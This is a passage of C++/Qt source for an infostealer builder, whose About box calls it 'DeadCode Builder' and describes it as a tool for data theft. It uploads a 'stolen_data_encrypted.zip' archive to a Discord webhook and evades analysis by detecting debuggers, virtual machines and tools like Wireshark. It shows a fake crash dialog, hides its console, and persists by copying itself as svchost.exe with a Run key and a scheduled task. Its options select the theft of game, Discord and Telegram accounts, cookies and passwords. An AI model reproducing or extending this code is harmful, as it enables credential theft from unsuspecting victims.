        filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"stolen_data_encrypted.zip\""));
        QFile* file = new QFile(QString::fromStdString(filePath));
        if (!file->open(QIODevice::ReadOnly)) {
            emitLog("Ошибка: Не удалось открыть файл для отправки через Discord");
            delete file;
            delete multiPart;
            return;
        }
        filePart.setBodyDevice(file);
        file->setParent(multiPart);
        multiPart->append(filePart);

        QNetworkRequest request(QUrl(webhookUrl));
        QNetworkReply* reply = manager->post(request, multiPart);
        multiPart->setParent(reply);

        connect(reply, &QNetworkReply::finished, this, [this, reply]() {
            if (reply->error() == QNetworkReply::NoError) {
                emitLog("Данные успешно отправлены через Discord");
            } else {
                emitLog("Ошибка отправки через Discord: " + reply->errorString());
            }
            reply->deleteLater();
        });
    }
}

// Антианализ (проверка на виртуальную машину, отладчик и т.д.)
bool MainWindow::AntiAnalysis() {
    if (!config.antiVM) return false;

    emitLog("Запуск антианализа...");

    // Проверка на отладчик
    if (IsDebuggerPresent()) {
        emitLog("Обнаружен отладчик");
        return true;
    }

    // Проверка на виртуальную машину через реестр
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\DSDT\\VBOX__", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        emitLog("Обнаружена VirtualBox");
        return true;
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\vmware", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        emitLog("Обнаружен VMware");
        return true;
    }

    // Проверка процессов, связанных с анализом
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(pe32);
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                QString processName = QString::fromWCharArray(pe32.szExeFile).toLower();
                if (processName.contains("wireshark") || processName.contains("fiddler") || processName.contains("procmon") || processName.contains("ollydbg")) {
                    CloseHandle(hSnapshot);
                    emitLog("Обнаружен процесс анализа: " + processName);
                    return true;
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    // Проверка через тайминги (RDTSC для обнаружения эмуляции)
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    for (volatile int i = 0; i < 100000; i++);
    QueryPerformanceCounter(&end);
    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
    if (elapsed > 50) { // Порог для обнаружения замедления в ВМ
        emitLog("Обнаружено замедление, возможно, виртуальная машина");
        return true;
    }

    emitLog("Антианализ пройден, подозрительная среда не обнаружена");
    return false;
}

// Создание фейковой ошибки
void MainWindow::FakeError() {
    if (!config.fakeError) return;

    emitLog("Создание фейковой ошибки...");
    MessageBoxW(NULL, L"Critical Error: Application has encountered an unexpected error and will now close.\nError Code: 0x80000003", L"Fatal Error", MB_ICONERROR | MB_OK);
}

// Режим скрытности
void MainWindow::Stealth() {
    if (!config.silent) return;

    emitLog("Запуск в режиме скрытности...");
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE);
    }

    // Скрываем процесс из списка задач
    HMODULE hModule = GetModuleHandle(NULL);
    char path[MAX_PATH];
    GetModuleFileNameA(hModule, path, MAX_PATH);
    std::string processName = std::filesystem::path(path).filename().string();
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(pe32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, processName.c_str()) == 0) {
                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
                    if (hProcess) {
                        SetPriorityClass(hProcess, BELOW_NORMAL_PRIORITY_CLASS);
                        CloseHandle(hProcess);
                    }
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
}

// Обеспечение персистентности
void MainWindow::Persist() {
    if (!config.autoStart && !config.persist) return;

    emitLog("Настройка персистентности...");
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string exePath = path;

    // Копируем файл в %APPDATA%
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string persistPath = std::string(appDataPath) + "\\Microsoft\\Windows\\svchost.exe";
    try {
        std::filesystem::create_directories(std::filesystem::path(persistPath).parent_path());
        std::filesystem::copy_file(exePath, persistPath, std::filesystem::copy_options::overwrite_existing);
        emitLog("Файл скопирован для персистентности: " + QString::fromStdString(persistPath));
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования файла для персистентности: " + QString::fromStdString(e.what()));
        return;
    }

    if (config.autoStart) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "WindowsUpdateService", 0, REG_SZ, (BYTE*)persistPath.c_str(), persistPath.length() + 1);
            RegCloseKey(hKey);
            emitLog("Добавлен автозапуск в реестр");
        } else {
            emitLog("Ошибка добавления автозапуска в реестр");
        }
    }

    if (config.persist) {
        // Добавляем задачу в планировщик задач
        QProcess process;
        QString command = "schtasks /create /tn \"WindowsUpdateService\" /tr \"" + QString::fromStdString(persistPath) + "\" /sc onlogon /rl highest /f";
        process.start("cmd.exe", QStringList() << "/c" << command);
        if (process.waitForFinished() && process.exitCode() == 0) {
            emitLog("Добавлена задача в планировщик задач для персистентности");
        } else {
            emitLog("Ошибка добавления задачи в планировщик задач: " + process.readAllStandardError());
        }
    }
}

// Завершение приложения
void MainWindow::exitApp() {
    emitLog("Завершение приложения...");
    QApplication::quit();
}

// Обработчик ответа от сети
void MainWindow::replyFinished(QNetworkReply* reply) {
    if (reply->error() == QNetworkReply::NoError) {
        emitLog("Сетевой запрос успешно выполнен");
    } else {
        emitLog("Ошибка сетевого запроса: " + reply->errorString());
    }
    reply->deleteLater();
}

// Добавление лога в текстовое поле
void MainWindow::appendLog(const QString& message) {
    ui->textEdit->append(message);
}

// Обработчик нажатия кнопки "Собрать"
void MainWindow::on_buildButton_clicked() {
    if (isBuilding) {
        QMessageBox::warning(this, "Предупреждение", "Сборка уже выполняется!");
        return;
    }

    // Сохранение конфигурации
    config.token = ui->tokenLineEdit->text().toStdString();
    config.chatId = ui->chatIdLineEdit->text().toStdString();
    config.discordWebhook = ui->discordWebhookLineEdit->text().toStdString();
    config.filename = ui->filenameLineEdit->text().toStdString();
    config.encryptionKey1 = ui->encryptionKey1LineEdit->text().toStdString();
    config.encryptionKey2 = ui->encryptionKey2LineEdit->text().toStdString();
    config.encryptionSalt = ui->encryptionSaltLineEdit->text().toStdString();
    config.iconPath = ui->iconPathLineEdit->text().toStdString();
    config.githubToken = ui->githubTokenLineEdit->text().toStdString();
    config.githubRepo = ui->githubRepoLineEdit->text().toStdString();
    config.steam = ui->steamCheckBox->isChecked();
    config.steamMAFile = ui->steamMAFileCheckBox->isChecked();
    config.epic = ui->epicCheckBox->isChecked();
    config.roblox = ui->robloxCheckBox->isChecked();
    config.battlenet = ui->battlenetCheckBox->isChecked();
    config.minecraft = ui->minecraftCheckBox->isChecked();
    config.discord = ui->discordCheckBox->isChecked();
    config.telegram = ui->telegramCheckBox->isChecked();
    config.chatHistory = ui->chatHistoryCheckBox->isChecked();
    config.cookies = ui->cookiesCheckBox->isChecked();
    config.passwords = ui->passwordsCheckBox->isChecked();
    config.screenshot = ui->screenshotCheckBox->isChecked();
    config.fileGrabber = ui->fileGrabberCheckBox->isChecked();
    config.systemInfo = ui->systemInfoCheckBox->isChecked();
    config.socialEngineering = ui->socialEngineeringCheckBox->isChecked();
    config.antiVM = ui->antiVMCheckBox->isChecked();
    config.fakeError = ui->fakeErrorCheckBox->isChecked();
    config.silent = ui->silentCheckBox->isChecked();
    config.autoStart = ui->autoStartCheckBox->isChecked();
    config.persist = ui->persistCheckBox->isChecked();

    emitLog("Конфигурация сохранена, начало сборки...");

    // Генерация полиморфного кода и ключей
    generatePolymorphicCode();
    generateBuildKeyHeader();
    copyIconToBuild();

    // Выбор метода сборки
    QString buildMethod = ui->buildMethodComboBox->currentText();
    if (buildMethod == "Local Build") {
        buildTimer->start(100);
    } else if (buildMethod == "GitHub Actions") {
        triggerGitHubActions();
    }
}

// Обработчик выбора иконки
void MainWindow::on_iconBrowseButton_clicked() {
    QString fileName = QFileDialog::getOpenFileName(this, "Выберите иконку", "", "Icon Files (*.ico)");
    if (!fileName.isEmpty()) {
        ui->iconPathLineEdit->setText(fileName);
        emitLog("Выбрана иконка: " + fileName);
    }
}

// Сохранение конфигурации
void MainWindow::on_actionSaveConfig_triggered() {
    QString fileName = QFileDialog::getSaveFileName(this, "Сохранить конфигурацию", "", "Config Files (*.ini)");
    if (fileName.isEmpty()) return;

    QSettings settings(fileName, QSettings::IniFormat);
    settings.setValue("token", ui->tokenLineEdit->text());
    settings.setValue("chatId", ui->chatIdLineEdit->text());
    settings.setValue("discordWebhook", ui->discordWebhookLineEdit->text());
    settings.setValue("filename", ui->filenameLineEdit->text());
    settings.setValue("encryptionKey1", ui->encryptionKey1LineEdit->text());
    settings.setValue("encryptionKey2", ui->encryptionKey2LineEdit->text());
    settings.setValue("encryptionSalt", ui->encryptionSaltLineEdit->text());
    settings.setValue("iconPath", ui->iconPathLineEdit->text());
    settings.setValue("githubToken", ui->githubTokenLineEdit->text());
    settings.setValue("githubRepo", ui->githubRepoLineEdit->text());
    settings.setValue("steam", ui->steamCheckBox->isChecked());
    settings.setValue("steamMAFile", ui->steamMAFileCheckBox->isChecked());
    settings.setValue("epic", ui->epicCheckBox->isChecked());
    settings.setValue("roblox", ui->robloxCheckBox->isChecked());
    settings.setValue("battlenet", ui->battlenetCheckBox->isChecked());
    settings.setValue("minecraft", ui->minecraftCheckBox->isChecked());
    settings.setValue("discord", ui->discordCheckBox->isChecked());
    settings.setValue("telegram", ui->telegramCheckBox->isChecked());
    settings.setValue("chatHistory", ui->chatHistoryCheckBox->isChecked());
    settings.setValue("cookies", ui->cookiesCheckBox->isChecked());
    settings.setValue("passwords", ui->passwordsCheckBox->isChecked());
    settings.setValue("screenshot", ui->screenshotCheckBox->isChecked());
    settings.setValue("fileGrabber", ui->fileGrabberCheckBox->isChecked());
    settings.setValue("systemInfo", ui->systemInfoCheckBox->isChecked());
    settings.setValue("socialEngineering", ui->socialEngineeringCheckBox->isChecked());
    settings.setValue("antiVM", ui->antiVMCheckBox->isChecked());
    settings.setValue("fakeError", ui->fakeErrorCheckBox->isChecked());
    settings.setValue("silent", ui->silentCheckBox->isChecked());
    settings.setValue("autoStart", ui->autoStartCheckBox->isChecked());
    settings.setValue("persist", ui->persistCheckBox->isChecked());

    emitLog("Конфигурация сохранена в: " + fileName);
}

// Загрузка конфигурации
void MainWindow::on_actionLoadConfig_triggered() {
    QString fileName = QFileDialog::getOpenFileName(this, "Загрузить конфигурацию", "", "Config Files (*.ini)");
    if (fileName.isEmpty()) return;

    QSettings settings(fileName, QSettings::IniFormat);
    ui->tokenLineEdit->setText(settings.value("token").toString());
    ui->chatIdLineEdit->setText(settings.value("chatId").toString());
    ui->discordWebhookLineEdit->setText(settings.value("discordWebhook").toString());
    ui->filenameLineEdit->setText(settings.value("filename").toString());
    ui->encryptionKey1LineEdit->setText(settings.value("encryptionKey1").toString());
    ui->encryptionKey2LineEdit->setText(settings.value("encryptionKey2").toString());
    ui->encryptionSaltLineEdit->setText(settings.value("encryptionSalt").toString());
    ui->iconPathLineEdit->setText(settings.value("iconPath").toString());
    ui->githubTokenLineEdit->setText(settings.value("githubToken").toString());
    ui->githubRepoLineEdit->setText(settings.value("githubRepo").toString());
    ui->steamCheckBox->setChecked(settings.value("steam").toBool());
    ui->steamMAFileCheckBox->setChecked(settings.value("steamMAFile").toBool());
    ui->epicCheckBox->setChecked(settings.value("epic").toBool());
    ui->robloxCheckBox->setChecked(settings.value("roblox").toBool());
    ui->battlenetCheckBox->setChecked(settings.value("battlenet").toBool());
    ui->minecraftCheckBox->setChecked(settings.value("minecraft").toBool());
    ui->discordCheckBox->setChecked(settings.value("discord").toBool());
    ui->telegramCheckBox->setChecked(settings.value("telegram").toBool());
    ui->chatHistoryCheckBox->setChecked(settings.value("chatHistory").toBool());
    ui->cookiesCheckBox->setChecked(settings.value("cookies").toBool());
    ui->passwordsCheckBox->setChecked(settings.value("passwords").toBool());
    ui->screenshotCheckBox->setChecked(settings.value("screenshot").toBool());
    ui->fileGrabberCheckBox->setChecked(settings.value("fileGrabber").toBool());
    ui->systemInfoCheckBox->setChecked(settings.value("systemInfo").toBool());
    ui->socialEngineeringCheckBox->setChecked(settings.value("socialEngineering").toBool());
    ui->antiVMCheckBox->setChecked(settings.value("antiVM").toBool());
    ui->fakeErrorCheckBox->setChecked(settings.value("fakeError").toBool());
    ui->silentCheckBox->setChecked(settings.value("silent").toBool());
    ui->autoStartCheckBox->setChecked(settings.value("autoStart").toBool());
    ui->persistCheckBox->setChecked(settings.value("persist").toBool());

    emitLog("Конфигурация загружена из: " + fileName);
}

// Экспорт логов
void MainWindow::on_actionExportLogs_triggered() {
    QString fileName = QFileDialog::getSaveFileName(this, "Экспортировать логи", "", "Text Files (*.txt)");
    if (fileName.isEmpty()) return;

    QFile file(fileName);
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << ui->textEdit->toPlainText();
        file.close();
        emitLog("Логи экспортированы в: " + fileName);
    } else {
        emitLog("Ошибка: Не удалось экспортировать логи");
    }
}

// Выход из приложения
void MainWindow::on_actionExit_triggered() {
    exitApp();
}

// Отображение информации о программе
void MainWindow::on_actionAbout_triggered() {
    QMessageBox::about(this, "О программе", "DeadCode Builder\nВерсия: 1.0.0\nРазработчик: xAI\nОписание: Инструмент для создания и настройки сборок с функциями кражи данных.");
}